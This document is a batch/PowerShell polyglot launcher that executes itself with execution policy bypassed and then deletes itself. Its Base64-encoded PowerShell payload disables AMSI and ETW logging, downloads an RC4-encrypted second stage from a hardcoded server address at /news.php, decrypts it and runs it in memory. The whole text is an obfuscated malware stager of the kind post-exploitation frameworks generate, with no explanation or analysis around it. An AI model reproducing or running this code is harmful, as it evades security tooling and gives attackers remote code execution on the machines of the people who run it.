# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBJAG8AbgBUAEEAQgBsAGUALgBQAFMAVgBlAHIAUwBJAG8AbgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAEYAXQAuAEEAUwBzAGUATQBCAGwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBFAFQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAGEATAB1AGUAKAAkAE4AdQBMAEwALAAkAFQAcgBVAGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAG0AXwBlACcAKwAnAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuACcAKwAnAFAAdQBiAGwAaQBjACwAJwArACcASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQAnACsAJwBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAJwArACcAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAGUAdAAnACsAJwB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgAnACsAJwBsAGkAYwAsAFMAJwArACcAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAVABlAG0ALgBOAEUAVAAuAFMAZQByAHYASQBDAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBDAFQAMQAwADAAQwBPAE4AdABpAE4AVQBFAD0AMAA7ACQANAA2AGQAPQBOAEUAVwAtAE8AYgBqAEUAQwBUACAAUwBZAHMAVABFAE0ALgBOAGUAdAAuAFcAZQBCAEMAbABJAGUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAEMATwBkAEkATgBHAF0AOgA6AFUAbgBpAGMATwBkAEUALgBHAGUAVABTAHQAcgBJAG4ARwAoAFsAQwBvAE4AdgBFAHIAVABdADoAOgBGAFIAbwBNAEIAYQBzAEUANgA0AFMAVABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAGMAQQBNAGcAQQB1AEEARABJAEEATwBRAEEAdQBBAEQASQBBAE0AQQBBAHgAQQBDADQAQQBNAFEAQQB3AEEARABJAEEATwBnAEEANABBAEQATQBBAE8AQQBBAHoAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAA0ADYAZAAuAEgAZQBhAGQARQByAFMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADQANgBkAC4AUAByAE8AeABZAD0AWwBTAFkAcwBUAGUAbQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAVQBFAFMAVABdADoAOgBEAEUAZgBBAHUATABUAFcAZQBCAFAAcgBvAHgAWQA7ACQANAA2AEQALgBQAHIAbwB4AHkALgBDAFIAZQBkAGUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAHkAcwBUAEUATQAuAE4AZQB0AC4AQwBSAEUAZABFAG4AdABpAGEATABDAGEAYwBoAEUAXQA6ADoARABFAGYAYQB1AEwAVABOAGUAdABXAG8AcgBrAEMAcgBlAGQAZQBOAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA0ADYAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABlAE0ALgBUAEUAeAB0AC4ARQBOAEMATwBEAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQB0AGUAUwAoACcAKgBlAGIAcgBNAHYAMgB8AEMANAAsAEgAUgAvAH4AbABFAEEAOAAtAD4AZwApAEcAIwA7AF4AewAoAEkAbQBkACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANAA2AGQALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHUAVABMAG0AQgB5AGYAYQBVAHUAdABqAGEAbQBGAD0AbQBMAFAATgBpAEIAZgBEADUASQB2AFAAegBUAHIAVQA4AHYAcABQAFkATAB2AEoATABnAE0APQAiACkAOwAkAEQAQQBUAGEAPQAkADQANgBkAC4ARABPAFcAbgBMAG8AQQBEAEQAYQBUAEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQAZABhAHQAQQA9ACQAZABhAFQAYQBbADQALgAuACQARABBAHQAYQAuAEwAZQBuAEcAVABIAF0AOwAtAEoATwBJAE4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
